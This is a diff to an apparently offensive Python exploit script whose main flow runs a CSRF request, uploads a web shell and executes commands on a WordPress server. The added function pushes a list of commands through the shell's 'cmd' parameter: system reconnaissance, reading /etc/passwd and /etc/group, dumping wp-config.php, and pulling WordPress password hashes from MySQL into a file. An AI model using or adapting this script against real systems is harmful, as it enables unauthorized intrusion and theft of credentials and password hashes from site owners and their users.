@@ -119,9 +119,25 @@ def code_exec():
     except:
         print('\n[x] Failed to execute PHP code...')
 
+def code_exec_list():
+    commands = [
+        "ls -l /var/www", "id", "id", "netstat -nat", "whoami", "date", "cat /proc/meminfo", 
+        "netstat -l", "who", "pwd", "clear", "ip addr", "ls -l", "uname -r", "ps -A", 
+        "cat /etc/resolv.conf", "last", "uptime", "cat /etc/passwd", "lsb_release -a", 
+        "netstat -t", "df -h", "ls -laR /var/www", "uname -a", "ls -l /home", "cat /etc/group",
+        "cat /var/www/html/wordpress/wp-config.php", "mysql -u wordpress -pwordpress wordpress -N -e \"SELECT user_pass FROM wp_users\" | tail -n 1 > hash.txt"
+    ]
+    try:
+        for cmd in commands:
+            response = session.get(f"{shell}?cmd={cmd}")
+            print(f"\n[+] Executing: {cmd}")
+            print(response.text.replace('GIF689a;','').replace('�',''))
+            time.sleep(10)
+    except:
+        print('\n[x] Failed to execute PHP code...')
 
 banner()
 csrfRequest()
 nameRandom()
 shell_upload()
-code_exec()
+code_exec_list()
